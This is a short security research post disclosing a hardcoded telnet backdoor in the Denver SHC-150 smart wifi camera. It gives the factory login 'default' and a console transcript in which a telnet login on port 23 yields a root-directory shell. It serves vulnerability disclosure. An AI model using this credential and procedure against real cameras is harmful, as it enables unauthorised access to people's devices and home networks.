---
title: Denver SHC-150 Camera Backdoor
categories: [Exploitation]
tags: [research, backdoor, iot]
---

<p align="center">
  <img width="100%" src="/assets/img/shc-150-specs.png">
</p>

Backdoor was found in a Denver SHC-150 Smart Wifi Camera by Ivan Nikolsky, security researcher from EntySec.

> I bought this model of wifi camera in the shop and before setting it up, checked it for vulnerabilities and backdoors.
> I scanned this camera for open ports and noticed that telnet service is running on port 23. I brute-forced credentials and logged right to the shell.
> There is no way to close this port or change credentials - they are hardcoded. Maybe other models also have this backdoor too, I am not sure.
>
> -- <cite>Ivan Nikolskiy</cite>

So, the telnet service, as Ivan noticed, has hardcoded credentials and after brute-forcing them he found out that the only thing which is needed to login is username - `default`.

```console
enty8080@Ivans-Air ~ % telnet 192.168.2.118 23
Trying 192.168.2.118...
Connected to pc192-168-2-118.
Escape character is '^]'.

goke login: default
$ ls /
bin      home     linuxrc  opt      run      tmp
dev      init     media    proc     sbin     usr
etc      lib      mnt      root     sys      var
$ pwd
/home/default
$ exit
Connection closed by foreign host.
enty8080@Ivans-Air ~ %
```

As you can see, successfull login leads to the shell of the camera. Also he found out that Denver SHC-150 Smart Wifi Camera runs on `armle` CPU and has `r/w` filesystem.

> So, backdoor is a factory telnet credential - `default`.
> Just open the telnet connection with the camera on port 23 and enter `default`.
> After this, you'll get a Linux shell.
> Backdoor allows an attacker to execute commands on OS lever through telnet.
>
> -- <cite>Ivan Nikolskiy</cite>

Ivan has already posted this research [here](https://www.exploit-db.com/exploits/50160).
